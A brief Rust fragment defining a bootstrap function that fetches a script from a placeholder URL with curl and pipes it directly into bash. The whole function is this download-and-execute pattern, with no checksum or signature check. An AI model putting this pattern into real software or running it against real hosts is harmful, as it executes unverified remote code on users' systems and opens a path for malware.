use std::process::{Command,Stdio};
fn bootstrap() -> std::io::Result<()> {
    let transfer = std::process::Command::new("curl").args(["-fsSL", "https://example.invalid/install.sh"])
        .stdout(Stdio::piped()).spawn()?;
    let _ = std::process::Command::new("bash").stdin(transfer.stdout.unwrap()).status()?;
    Ok(())
}
